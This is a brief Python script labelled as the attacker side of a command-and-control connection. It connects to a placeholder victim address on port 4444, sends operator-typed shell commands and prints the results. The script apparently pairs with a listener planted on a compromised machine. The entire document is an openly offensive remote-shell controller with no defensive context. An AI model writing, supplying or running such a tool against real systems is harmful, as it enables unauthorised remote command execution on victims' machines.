# server_c2_connect.py (Attacker Side)
import socket

TARGET_IP = 'VICTIM_IP_HERE'
PORT = 4444

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, PORT))
    print(f"[+] Connected to {TARGET_IP}:{PORT}")

    while True:
        cmd = input("$ ")
        if cmd.lower() in ['exit', 'quit']:
            break
        s.send(cmd.encode())
        data = s.recv(4096).decode()
        print(data, end="")

    s.close()

if __name__ == "__main__":
    main()
